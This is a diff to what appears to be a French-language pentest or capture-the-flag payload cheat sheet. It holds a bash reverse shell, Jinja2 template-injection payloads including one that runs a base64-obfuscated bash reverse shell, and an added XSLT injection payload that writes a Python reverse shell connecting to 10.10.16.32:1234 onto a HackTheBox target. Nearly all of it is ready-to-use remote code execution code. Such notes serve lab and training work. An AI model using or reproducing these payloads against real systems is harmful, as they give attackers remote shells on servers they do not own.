@@ -117,6 +117,22 @@ CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.10.10/1234 0>&1')
 - Jinga :
   	- `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` --> payload id
   	- `{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').system("echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjkvNDQ0NCAwPiYx | base64 -d | bash")}}{%endif%}{% endfor %}` --> RCE avec base64
+
+- RCE XXE :
+```xml=
+┌──(kali㉿kali)-[~/HTB/Box/Conversor]
+└─$ cat payloaddd.xslt 
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet
+ xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+ xmlns:exploit="http://exslt.org/common" 
+ extension-element-prefixes="exploit"
+ version="1.0">
+ <xsl:template match="/">
+ <exploit:document href="/var/www/conversor.htb/scripts/shell.py" method="text">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.32",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")</exploit:document>
+ </xsl:template>
+</xsl:stylesheet>
+```
  
 ---
  
